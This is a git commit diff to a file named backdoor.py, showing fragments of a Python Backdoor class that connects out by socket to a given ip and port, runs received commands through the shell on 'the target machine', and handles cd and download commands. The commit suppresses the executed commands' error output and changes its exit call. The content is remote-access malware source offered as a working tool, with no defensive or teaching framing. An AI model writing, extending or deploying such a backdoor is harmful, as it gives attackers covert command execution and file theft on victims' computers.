75502dc75d59d410170e4b327b7080ef6bf30bda
TK-Linux <74335372+TKLinux966@users.noreply.github.com>
2021-06-30 20:16:58 -0700

    Update backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -4,6 +4,7 @@ import socket
 import subprocess
 import json
 import base64
+import sys
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -41,7 +42,7 @@ class Backdoor:
 
     def execute_system_command(self, command):
         try:
-            result = subprocess.check_output(command, shell=True)
+            result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
             return result
         except subprocess.CalledProcessError:
             return b"[-] This command is not found on the target machine."
@@ -53,7 +54,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download" and len(command) > 1:
